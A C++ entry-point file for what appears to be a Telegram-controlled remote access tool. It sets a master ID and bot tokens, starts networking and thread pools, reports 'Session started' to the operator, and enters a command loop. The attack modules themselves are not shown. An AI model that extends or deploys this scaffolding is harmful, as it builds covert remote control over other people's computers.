#include "macro.hpp"
#include "rat/tbot/tbot.hpp"
#include "rat/Handler.hpp"
#include "logging.hpp"
#include "rat/system.hpp"

#include <atomic>
#include <chrono>
#include <condition_variable>
#include <csignal>
#include <cstdint>
#include <fmt/chrono.h>
#include <fmt/core.h>
#include <iostream>
#include <mutex>
#include <string>
#include <thread>
#include <cstdint>

#ifdef _WIN32
#  include <windows.h>
#endif


constexpr uint8_t NUMBER_OF_THREADS_INSISDE_SHORT_PROCESS_POOL = 1;
constexpr uint8_t NUMBER_OF_THREADS_INSISDE_LONG_PROCESS_POOL = 1;
constexpr uint8_t NUMBER_OF_THREADS_INSISDE_HELPER_POOL = 2;

constexpr uint8_t NETWORKING_OPERATION_RESTART_BOUND = 5; 

static void botLoop();

int main() {
    botLoop();
    return 0;
}

static void botLoop() {

    DEBUG_LOG("Bot constructing");


    rat::handler::Handler session_handler;
    
    session_handler.setMasterId(MASTER_ID);
    session_handler.initMainBot(TOKEN1_odahimbotzawzum);
    session_handler.initBackingBot(TOKEN_ODAHIMBOT);

    session_handler.initCurlClient(NETWORKING_OPERATION_RESTART_BOUND);

    session_handler.initThreadPools(NUMBER_OF_THREADS_INSISDE_SHORT_PROCESS_POOL, 
                                    NUMBER_OF_THREADS_INSISDE_LONG_PROCESS_POOL,
                                    NUMBER_OF_THREADS_INSISDE_HELPER_POOL);

    session_handler.bot->sendMessage(fmt::format("Session started at: {}", ::rat::system::getCurrentDateTime()));

    session_handler.handleUpdates();

}
